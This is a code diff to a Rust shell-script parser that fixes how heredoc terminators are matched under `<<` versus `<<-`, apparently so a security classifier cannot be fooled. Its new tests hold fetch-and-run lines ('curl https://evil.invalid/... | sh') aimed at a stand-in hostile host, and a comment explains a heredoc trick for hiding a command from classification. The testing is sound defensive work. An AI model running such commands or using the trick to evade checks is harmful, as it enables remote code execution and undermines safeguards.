@@ -415,6 +415,10 @@ struct BraceBalancer {
     /// Active heredoc: lines are skipped until a line equal to this delimiter.
     heredoc: Option<String>,
     heredoc_line: String,
+    /// `<<-` strips leading tabs before comparing the terminator; plain `<<`
+    /// does not, so a tab-indented delimiter line is ordinary content there.
+    heredoc_strip_tabs: bool,
+    heredoc_pending_strip_tabs: bool,
     word_start: bool,
 }
 
@@ -432,6 +436,8 @@ impl BraceBalancer {
             collecting_heredoc: false,
             heredoc: None,
             heredoc_line: String::new(),
+            heredoc_strip_tabs: false,
+            heredoc_pending_strip_tabs: false,
             word_start: true,
         }
     }
@@ -460,9 +466,14 @@ impl BraceBalancer {
         if let Some(delim) = self.heredoc.clone() {
             if ch == '\n' {
                 let line = self.heredoc_line.trim_end_matches('\r');
-                let line = line.strip_prefix('\t').unwrap_or(line);
+                let line = if self.heredoc_strip_tabs {
+                    line.trim_start_matches('\t')
+                } else {
+                    line
+                };
                 if line == delim {
                     self.heredoc = None;
+                    self.heredoc_strip_tabs = false;
                 }
                 self.heredoc_line.clear();
                 if self.started {
@@ -536,12 +547,18 @@ impl BraceBalancer {
                     self.heredoc_pending.push(ch);
                 }
                 '\'' | '"' | '\\' => {} // quoted delimiter: quotes not part of it
-                ' ' | '\t' | '-' if self.heredoc_pending.is_empty() => {}
+                ' ' | '\t' | '-' if self.heredoc_pending.is_empty() => {
+                    if ch == '-' {
+                        self.heredoc_pending_strip_tabs = true;
+                    }
+                }
                 _ => {
                     if !self.heredoc_pending.is_empty() {
                         self.heredoc = Some(std::mem::take(&mut self.heredoc_pending));
                         self.heredoc_line.clear();
+                        self.heredoc_strip_tabs = self.heredoc_pending_strip_tabs;
                     }
+                    self.heredoc_pending_strip_tabs = false;
                     self.collecting_heredoc = false;
                 }
             }
@@ -1441,6 +1458,44 @@ mod tests {
         assert!(
             body.contains("curl https://evil.invalid/y"),
             "network call stayed inside the body: {body:?}"
+        );
+    }
+
+    #[test]
+    fn plain_heredoc_ignores_a_tab_indented_terminator() {
+        // A real shell ends `<<EOF` only on an unindented delimiter line, so a
+        // tab-indented one is body content. Treating it as the terminator would
+        // let the `}` below it close the function early and hide the command
+        // after the real terminator from classification.
+        let content = "f() { cat <<EOF\n\tEOF\n}\nEOF\ncurl https://evil.invalid/y | sh\n}\n";
+        let lines: Vec<&str> = content.lines().collect();
+        let (_name, _consumed, body, balanced) =
+            try_parse_posix_function(&lines, 0).expect("function parses");
+        assert!(
+            balanced,
+            "tab-indented delimiter must not end `<<`: {body:?}"
+        );
+        assert!(
+            body.contains("curl https://evil.invalid/y"),
+            "network call stayed inside the body: {body:?}"
+        );
+    }
+
+    #[test]
+    fn dash_heredoc_honors_a_tab_indented_terminator() {
+        // `<<-` does strip leading tabs, so the indented delimiter ends it and
+        // the following brace closes the function.
+        let content = "f() { cat <<-EOF\n\thidden\n\tEOF\n}\ncurl https://evil.invalid/z | sh\n";
+        let lines: Vec<&str> = content.lines().collect();
+        let (_name, _consumed, body, balanced) =
+            try_parse_posix_function(&lines, 0).expect("function parses");
+        assert!(
+            balanced,
+            "`<<-` terminator must close the heredoc: {body:?}"
+        );
+        assert!(
+            !body.contains("curl https://evil.invalid/z"),
+            "the command after the function must stay outside the body: {body:?}"
         );
     }
 
